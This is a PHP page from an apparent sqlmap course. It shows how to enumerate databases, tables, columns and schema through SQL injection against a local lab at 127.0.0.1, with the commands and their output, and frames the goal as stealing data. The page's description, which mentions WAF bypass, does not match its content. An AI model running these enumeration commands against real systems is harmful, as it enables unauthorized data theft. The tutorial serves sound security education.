<?php
    require_once 'relative_init.php';
    include_once SHARED_PATH . 'course_header.php';

     // Title and description are set in page_header.php
    $title = "Get Database Structure Information";
    $description = "Learn how to bypass web application firewalls with Sqlmap.";
    include_once SHARED_PATH . 'page_header.php';

    // Legal disclaimer and terminal animations
    $terminal_text = 'sudo apt-get install -y python3';
    include SHARED_PATH . 'terminal_text.php';
    include_once SHARED_PATH . 'legal_disclaimer.php';
    $terminal_text = 'python3 --version';
    include SHARED_PATH . 'terminal_text.php';

    // Tutorial navigation buttons
    $previous = 'stealing-dbms-usernames-and-passwords.php';
    $home = 'sqlmap-course-home.php#tutorials';
    $next = 'stealing-dbms-usernames-and-passwords.php';
    include SHARED_PATH . 'tutorial_navigation.php';

    // Table of contents
    include SHARED_PATH . 'table_of_contents.php';
?>

    <div class="course-top-level-container">
      <h1 class="title toc">Getting database object information</h1>
      <p>
        Finding out information about the databases, tables, and table columns
        can be useful if you are looking to steal information from a specific
        table in a specific database, or if you need to gather reconnaissance.
      </p>
      <p>
        There are four flags we will look at that are used for retrieving the
        database names, database table names, table column names, and the
        database schema respectively.
      </p>

<pre class="lang-bash default-code-style dark-mode-background">
    --dbs               Enumerate DBMS databases
    --tables            Enumerate DBMS database tables
    --columns           Enumerate DBMS database table columns
    --schema            Enumerate DBMS schema</pre>
    
      <h1 class="title toc">Enumerate DBMS databases</h1>
      <p>
        The DBMS are all of the databases that are being stored by the database
        software that the vulnerable application is using. Not every database
        being stored on the DBMS will be related to the application itself, which
        makes this attack extra potent.
      </p>

<pre class="lang-bash default-code-style dark-mode-background">
kali@kali:~$ python3 sqlmap.py -u http://127.0.0.1/ <mark>--dbs</mark> --forms --batch --random-agent

[21:54:11] [INFO] fetching database names
<mark>available databases [6]:</mark>
[*] information_schema
[*] math
[*] mysql
[*] performance_schema
[*] sql_injection_labs
[*] template</pre>

      <p>
        From the output we see that Sqlmap was able to find six databases running
        on the DBMS that is hosting the vulnerable applcation. Take note that the
        vulnerable application only interacts with the <span class="inline-code">
        sql_injection_labs</span>, the other five databases are MySQL specific or
        belong to other applications that use the DBMS.
      </p>
      <p>
        This is one of the reasons why SQL injection is so dangerous: if one single
        application is vulnerable to injection, then all other applications that use
        the same server as a database are also vulnerable to a data breach.
      </p>

      <h1 class="title toc">Enumerate DBMS database tables</h1>
      <p>
        Recall that a <i>relational database</i> is a database that structures
        data by using tables. Each database consists of related tables that
        contain the actual data that we are interested in stealing.
      </p>
      <p>
        To get a list of tables and their corresponding database, we use
        the <span class="inline-code">&ndash;&ndash;tables</span> flag.
      </p>

<pre class="lang-bash default-code-style dark-mode-background">
kali@kali:~$ python3 sqlmap.py -u http://127.0.0.1/ <mark>--tables</mark> --forms --batch --random-agent

[22:00:07] [INFO] fetching database names
[22:00:07] [INFO] fetching tables for databases: 'information_schema, math, mysql, performance_schema, sql_injection_labs, template'
<mark>Database: information_schema
[78 tables]</mark>
+----------------------------------------------------+
| ALL_PLUGINS                                        |
| APPLICABLE_ROLES                                   |
| CHARACTER_SETS                                     |
| CHECK_CONSTRAINTS                                  |
| CLIENT_STATISTICS                                  |
| VIEWS                                              |
| user_variables                                     |
+----------------------------------------------------+

<mark>Database: sql_injection_labs
[2 tables]</mark>
+----------------------------------------------------+
| user                                               |
| product                                            |
+----------------------------------------------------+

<mark>Database: template
[1 table]</mark>
+----------------------------------------------------+
| code_template                                      |
+----------------------------------------------------+

<mark>Database: mysql
[31 tables]</mark>
+----------------------------------------------------+
| user                                               |
| column_stats                                       |
| columns_priv                                       |
| db                                                 |
| transaction_registry                               |
+----------------------------------------------------+

<mark>Database: math
[5 tables]</mark>
+----------------------------------------------------+
| category                                           |
| problem                                            |
| sub_topic                                          |
| subject                                            |
| topic                                              |
+----------------------------------------------------+

<mark>Database: performance_schema
[52 tables]</mark>
+----------------------------------------------------+
| accounts                                           |
| cond_instances                                     |
| threads                                            |
| users                                              |
+----------------------------------------------------+</pre>

      <p>
        I cut a lot of the output because there are too many tables to show here.
        As we see, we now have a list of each database with every corresponding
        table in that database.
      </p>
      
      <h1 class="title toc">Enumerate DBMS database table columns</h1>
      <p>
        If we want to take it a step further, we can get the column names and
        data types for each column of each table. To do this, we use the
        <span class="inline-code">&ndash;&ndash;columns</span>.
      </p>

<pre class="lang-bash default-code-style dark-mode-background">
kali@kali:~$ python3 sqlmap.py -u http://127.0.0.1/ <mark>--columns</mark> --forms --batch --random-agent

Database: sql_injection_labs
Table: product
[2 columns]
+--------+--------------+
| Column | Type         |
+--------+--------------+
| name   | varchar(25)  |
| price  | double(10,2) |
+--------+--------------+

Database: sql_injection_labs
Table: user
[2 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| password | varchar(20) |
| username | varchar(20) |
+----------+-------------+</pre>

      <p>
        We see the column name and data type for each table in <span class="inline-code">
        sql_injection_labs</span>. Notice how this command only worked on the
        database that the vulnerable application uses.
      </p>
      
      <h1 class="title toc">Enumerate DBMS schema</h1>
      <p>
        To get the schema of the entire database we use the <span class="inline-code">
        &ndash;&ndash;schema</span> flag. This flag is a combination of all three
        of the previous flags. The output will look similar to using the
        <span class="inline-code">&ndash;&ndash;columns</span> flag, except
        we will get all column names and column data types for every table in
        every database.
      </p>
      <p>
        The output is ommited because this command will output hundreds of lines
        to the console.
      </p>

<pre class="lang-bash default-code-style dark-mode-background">
python3 sqlmap.py -u http://127.0.0.1/ <mark>--schema</mark> --forms --batch --random-agent</pre>

    </div>

    <?php include SHARED_PATH . 'tutorial_navigation.php'; ?>
    <div class="course-top-level-container">
    <?php
        $tags = array(
            'Sqlmap',
            'Python3',
            'Debian Linux',
            'Bash'
        );
        
        generate_technology_tags($tags);
    ?>
    </div>

<?php require_once SHARED_PATH . 'page_footer.php'; ?>